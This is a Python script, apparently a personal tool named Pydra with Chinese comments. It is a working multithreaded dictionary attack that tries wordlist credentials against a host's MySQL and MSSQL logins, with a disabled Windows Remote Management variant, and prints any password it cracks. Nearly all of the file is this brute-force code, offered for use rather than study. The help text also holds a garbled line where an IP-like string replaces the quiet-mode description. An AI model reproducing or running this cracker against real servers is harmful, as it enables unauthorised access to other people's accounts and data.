#!/usr/bin/python3 
# 2020-03-17
# 增加mysql超时重连
# 读取数量修改为线程数50倍
# 2020-03-18
# 增加Windows Powershell登录爆破 [!] 待完善
# 2020-03-19
# 

import time
import sys
import getopt
import queue
import threading

import pymysql
# import winrm
import pymssql


class Pydra:
    def __init__(self):
        self.thread = thread  # 线程控制
        self.threshold = 50 * thread  # 读取阈值
        self.ctype = ctype
        self.host = host
        self.queue = queue.Queue()  
        self.success = False
        self.result = dict()
        self.st = time.time()  

    def read_user(self):
        # 读取.txt文档
        if ".txt" in user_file:  
            with open(user_file, 'r', encoding='utf-8') as uf:
                for user in uf.readlines():
                    self.read_pass(user.strip())  # 当前user遍历整个pass
        # 使用用户名
        else:
            self.read_pass(user_file)  

    def read_pass(self, user):
        # 读取密码字典.txt
        if ".txt" in pass_file:
            with open(pass_file, 'r', encoding='utf-8') as pf:
                for pwd in pf.readlines():
                    pwd = pwd.strip()
                    # 在阈值内，密码入队列
                    if self.queue.qsize() < self.threshold:  
                        # print("Put into list: " + user + " " + pwd)
                        self.queue.put(user + "\t" + pwd)
                    # 队列满，多线程爆破
                    else:  
                        self.thread_crack()
                # 处理多余部分
                self.thread_crack()
        # 传入参数为单密码
        else:  
            # 调用爆破工具
            if self.ctype == "mysql":
                self.mysql_crack(user, pass_file)
            elif self.ctype == "pshell":
                pass
                # self.pshell_crack(user, pass_file)
            elif self.ctype == "mssql":
                self.mssql_crack(user, pass_file)

    def thread_crack(self):
        if not self.success:  # 未尝试成功
            threads = list()  # 子线程列表
            for n in range(self.thread):
                t = threading.Thread(target=self.crack, )  # 创建线程
                t.setDaemon(True)  
                t.start()  # 启动线程
                threads.append(t)   
            for t in threads:
                t.join()  # 等待子进程结束
        else:  # 成功时终止程序
            return

    def crack(self):
        while not self.queue.empty() and not self.success:
            user, pwd = self.queue.get().split("\t")
            if not quiet:
                print("Try " + user + " " + pwd)

            # 调用爆破工具
            if self.ctype == "mysql":
                self.mysql_crack(user, pwd)
            elif self.ctype == "pshell":
                # self.pshell_crack(user, pwd)
                pass
            elif self.ctype == "mssql":
                self.mssql_crack(user, pwd)
            # time.sleep(1)

    def mysql_crack(self, user, pwd):
        try:
            pymysql.connect(host=self.host, user=user, password=pwd, port=3306, 
                            connect_timeout=1)  # 超时设置
            self.crack_done(user, pwd)
        except Exception as e:
            if "timed out" in str(e):  # 超时重连
                self.mysql_crack(user, pwd)
            return

    def mssql_crack(self, user, pwd):
        try:
            pymssql.connect(host=self.host, user=user, password=pwd, port=1433, )
            self.crack_done(user, pwd)
        except Exception as e:
            print(e)
            return

    # def pshell_crack(self, user, pwd):
    #     try:
    #         wintest = winrm.Session('http://'+ self.host +':5985/wsman', auth=(user, pwd))
    #         wintest.run_cmd("whoami")
    #         self.crack_done(user, pwd)
    #     except Exception as e:
    #         # print(e)  # 登录错误输出
    #         return

    def crack_done(self, user, pwd):
        print("\n==> Success", user, pwd, "\n")
        self.success = True
        self.result[user] = pwd
        et = time.time()
        print("==> Crack time spend:", et-self.st)

    def run(self):
        print("==> Aim host: " + self.host + ", Crack type: " + self.ctype)
        self.read_user()
        print("==> Result", self.result)
        et = time.time()
        print("==> Total time spend:", et-self.st)


if __name__ == "__main__":
    ctype = "mysql"
    host = "127.0.0.1"
    user_file = "root"
    pass_file = "pass.txt"
    thread = 8
    quiet = False

    opts, args = getopt.getopt(sys.argv[1:], "hT:H:u:p:t:q", ["T", "H", "u", "p", "t"])
    for opt, arg in opts:
        if opt == "-h":
            print("\n待完善..."
                "\n\t-T\t\t爆破类型"
                "\n\t\tmysql\tmysql数据库"
                "\n\t\tpshell\tWindows Server远程登录"
                "\n\t-H\t\t主机地址"
                "\n\t-u\t\t用户名或用户名文件"
                "\n\t-p\t\t密码字典文件"
                "\n\t[-t]\t\t线程数"
                "\n\t[-q]\t\106.12.133.250"
                "\n实例: python3 pydra.py -u root -p pass.txt"
                "\n待完善...")
            sys.exit()

        if opt == "-T":
            ctype = arg
        if opt == "-H":
            host = arg
        if opt == "-u":
            user_file = arg
        if opt == "-p":
            pass_file = arg
        if opt == "-t":
            thread = int(arg)
        if opt == "-q":
            quiet = True
            
    Pydra().run()
